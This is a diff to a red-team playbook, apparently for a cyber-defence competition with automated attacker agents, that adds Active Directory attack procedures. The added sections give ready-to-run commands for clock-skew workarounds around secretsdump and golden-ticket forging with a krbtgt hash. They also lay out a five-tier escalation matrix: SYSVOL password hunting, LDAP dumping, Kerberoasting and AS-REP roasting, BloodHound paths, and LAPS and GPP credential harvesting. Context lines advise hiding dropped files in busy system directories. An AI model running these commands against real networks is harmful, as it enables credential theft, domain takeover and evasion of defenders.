@@ -586,7 +586,18 @@ sudo date -s "$(crackmapexec smb <DC-IP> -u '' -p '' 2>&1 | grep -oP '\d{4}-\d{2
 
 **Common CCDC pitfall:** Competition infrastructure may run in UTC while the jumpbox is in PDT/PST (UTC-7/UTC-8). A clock that "looks right" in local time can be 7-8 hours off in UTC, causing every Kerberos operation to fail. Always compare in UTC.
 
-If clock sync fails or ntpdate is blocked, use Impacket's `-ts` flag where available, or pass `-dc-ip` explicitly to let Impacket handle the time offset internally.
+If clock sync fails or ntpdate is blocked, use one of these alternatives:
+
+**Step 3a — FAKETIME workaround (PREFERRED):** Use libfaketime to forge the system time for individual commands without changing the jumpbox clock. This avoids NTP dependency and works in competition environments where NTP infrastructure is controlled by the blue team.
+```
+faketime '+Xh' impacket-smbclient <domain>/<user>:<password>@<DC-IP>
+faketime '+Xh' evil-winrm -i <DC-IP> -u <user> -p <password>
+faketime '+Xh' impacket-secretsdump <domain>/<user>:<password>@<DC-IP>
+faketime '+Xh' impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain <domain> Administrator
+```
+Where `+Xh` is the offset hours between the jumpbox and the DC (e.g., `+7h` if the DC is UTC and the jumpbox is PDT). Determine the offset from CME SMB output or `net time \\<DC-IP>`. FAKETIME affects only the child process — the jumpbox system clock is unchanged, so other operations are unaffected. Install on Kali if not present: `apt install faketime`.
+
+**Step 3b — Impacket flags:** Use Impacket's `-ts` flag where available, or pass `-dc-ip` explicitly to let Impacket handle the time offset internally. This is less reliable than FAKETIME for large offsets (>5 minutes).
 
 ### Impacket Binary Names — Kali-Specific
 
@@ -753,6 +764,45 @@ Avoid creating files on the target where possible. When files must be created:
 - Place them in existing high-traffic directories (C:\ProgramData, C:\Windows\Temp, /tmp, /var/tmp) to blend with legitimate activity.
 - Do NOT rely on timestomping to hide file drops — the AI blue team correlates MFT records, USN journals, and prefetch data that timestomping does not affect.
 - Clean up dropped files immediately after use if they are not part of a persistence mechanism.
+
+## Domain User — Post-Spray Escalation Matrix
+
+When a credential spray yields domain user accounts with no admin rights (e.g., SMB read access but no local admin, no DA), do NOT mark the team as BLOCKED. Non-admin domain user credentials unlock a significant escalation surface. Proceed through the following tiers in order before declaring the escalation path exhausted:
+
+**Tier 1 — SMB Share Crawl (fastest, highest ROI):**
+```
+smbmap -H <dc_ip> -u <user> -p <pass> -R
+netexec smb <dc_ip> -u <user> -p <pass> --shares
+```
+Look for: SYSVOL/NETLOGON scripts with hardcoded passwords, accessible file shares with config files, backup scripts, or credential stores. Domain users have read access to SYSVOL by default — this often contains logon scripts with cleartext passwords.
+
+**Tier 2 — LDAP User/Group Enumeration:**
+```
+ldapdomaindump -u '<domain>\<user>' -p '<pass>' <dc_ip> -o /tmp/ldap-dump/
+```
+Identify: additional group memberships, accounts with password-not-required flag, accounts with delegation settings (unconstrained/constrained), service accounts with SPNs (Kerberoastable), AS-REP roastable accounts (no preauth required), DnsAdmins group members (DLL injection path to SYSTEM on DC).
+
+**Tier 3 — Kerberoasting / AS-REP Roasting:**
+```
+impacket-GetUserSPNs '<domain>/<user>:<pass>' -dc-ip <dc_ip> -request -outputfile /tmp/kerberoast.txt
+impacket-GetNPUsers '<domain>/' -dc-ip <dc_ip> -usersfile /tmp/ldap-dump/domain_users.grep -format hashcat -outputfile /tmp/asrep.txt
+```
+Crack offline with hashcat — any cracked SPN account is likely a service account with elevated privileges.
+
+**Tier 4 — ACL Enumeration (if time permits):**
+```
+bloodhound-python -u <user> -p <pass> -d <domain> -c All --zip -dc <dc_ip>
+```
+Import into BloodHound and check for: GenericWrite or WriteDacl on high-value objects, paths from owned users to Domain Admins, Resource-Based Constrained Delegation (RBCD) attack opportunities.
+
+**Tier 5 — LAPS and GPO Script Enumeration:**
+```
+netexec smb <dc_ip> -u <user> -p <pass> -M laps
+smbclient //<dc_ip>/SYSVOL -U '<domain>/<user>%<pass>' -c 'recurse on; ls'
+```
+If LAPS is deployed and the domain user's group can read `ms-Mds-AdmPwd`, local admin passwords for workstations become available. Browse SYSVOL for Group Policy Preferences (GPP) XML files with `cpassword` values, logon/startup scripts with hardcoded credentials, and scheduled task definitions referencing service accounts.
+
+Only after exhausting all five tiers should the team be marked as BLOCKED with no available escalation path. Log which tiers were attempted and their results so that OPS-001 can make an informed re-prioritization decision.
 
 ## Credential Harvesting Post-Access
 
